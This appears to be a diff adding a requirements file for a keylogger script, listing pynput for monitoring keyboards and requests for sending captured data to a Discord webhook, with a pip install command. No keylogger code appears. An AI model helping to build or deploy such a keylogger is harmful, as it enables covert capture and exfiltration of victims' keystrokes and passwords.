@@ -1,0 +1,11 @@
+# Keylogger Requirements
+
+To run the keylogger script, you need to install the following Python packages:
+
+- **pynput**: Library for controlling and monitoring input devices such as keyboards and mice.
+- **requests**: Library for making HTTP requests, used for sending data to the Discord webhook.
+
+You can install these packages using pip, the Python package manager. Open your terminal or command prompt and run the following command:
+
+```bash
+pip install pynput requests
